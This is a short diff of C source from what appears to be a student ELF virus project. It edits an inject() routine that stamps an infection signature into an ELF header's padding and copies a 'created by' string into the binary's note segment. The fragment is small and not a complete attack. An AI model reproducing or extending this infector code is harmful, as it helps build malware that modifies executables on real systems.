@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/10 20:09:17 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/11 12:41:38 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -25,6 +25,7 @@ void		inject(t_data *data)
 #endif
 
 	/* revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect); */
+
 
 	if (data->context == false || data->context != true)
 		goto next;
@@ -53,10 +54,11 @@ void		inject(t_data *data)
 	*(uint32_t*)&data->header->e_ident[EI_PAD] = SIGNATURE;
 
 	// step 3 : MORE SIGNATURE
+	char created[] = CREATED_BY;
 	lim = data->virus.note->p_offset;
 	for (register int i = 0 ; i < CREATE_SZ ; i++)
 	{
-		*dst++ = CREATED_BY[i];
+		*dst++ = created[i];
 		off++;
 	}
 
